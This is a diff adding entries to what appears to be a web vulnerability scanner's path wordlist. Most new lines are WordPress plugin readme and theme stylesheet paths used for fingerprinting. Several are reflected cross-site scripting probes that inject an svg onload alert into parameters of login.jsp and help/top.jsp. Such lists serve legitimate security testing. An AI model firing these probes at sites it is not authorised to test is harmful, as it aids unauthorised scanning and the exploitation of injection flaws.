@@ -12557,3 +12557,16 @@ request?info=<svg onload=alert(
 /wp-content/themes/listingeasy/style.css
 /wp-content/themes/electrician/style.css
 /wp-content/themes/invico/style.css
+/wp-content/plugins/copymatic/readme.txt
+/login.jsp?onlyOnePerVM=hebing%27%3E%3Csvg%20onload=alert(document.domain)%3E
+/login.jsp?redirect=hebing%27%3E%3Csvg%20onload=alert(document.domain)%3E
+/login.jsp?nodeid=hebing%27%3E%3Csvg%20onload=alert(document.domain)%3E
+/help/top.jsp?langcode=1%22%3E%3Csvg%20onload=alert(document.domain)%3E
+/help/top.jsp?langcode=1%22%3E%3C/script%3E%3Csvg%20onload=alert(document.domain)%3E
+/wp-content/themes/ofiz/style.css
+/wp-content/plugins/wp-auto-spinner/readme.txt
+/wp-content/plugins/manuall-dofollow/readme.txt
+/wp-content/plugins/media-folder/readme.txt
+/wp-content/plugins/tennis-court-bookings/readme.txt
+/wp-content/plugins/listly/readme.txt
+/wp-content/plugins/zuppler-online-ordering/readme.txt
